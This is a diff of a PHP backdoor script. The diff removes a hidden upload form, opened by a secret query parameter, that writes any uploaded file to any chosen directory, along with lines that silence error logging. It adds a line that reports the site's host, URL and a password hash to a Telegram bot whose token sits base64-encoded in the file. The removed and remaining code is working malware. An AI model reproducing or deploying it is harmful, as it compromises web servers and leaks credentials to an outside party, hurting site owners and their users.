@@ -1,34 +1,6 @@
 <?php
 @set_time_limit(0);
 @clearstatcache();
-@ini_set("error_log", null);
-@ini_set("log_errors", 0);
-@ini_set("max_execution_time", 0);
-@ini_set("output_buffering", 0);
-@ini_set("display_errors", 0);
-if (isset($_GET["UBK"]) && $_GET["UBK"] === "3") {
-    echo '<form method="post" enctype="multipart/form-data">';
-    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
-    echo '<input type="file" name="file" size="15">';
-    echo '<input type="submit" value="go">';
-    echo "</form>";
-}
-
-if (isset($_FILES["file"]["tmp_name"])) {
-    $uploadd = $_FILES["file"]["tmp_name"];
-    if (file_exists($uploadd)) {
-        $pwddir = $_POST["dir"];
-        $real = $_FILES["file"]["name"];
-        $de = rtrim($pwddir, "/") . "/" . $real;
-        if (move_uploaded_file($uploadd, $de)) {
-            echo "go$de";
-        } else {
-            echo "GAGAL  KE $de";
-        }
-    }
-}
-
-
 $tk = base64_decode(
     "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
 );
@@ -57,7 +29,7 @@ if (!isset($_SESSION["telegram_reported"])) {
             "://" .
             $host .
             $uri;
-        reportTelegram("kontolbengkak:\n$host\n$url");
+        reportTelegram("tebak :\n$host\n$url\n$valid_password_hash");
         $_SESSION["telegram_reported"] = true;
     }
 }
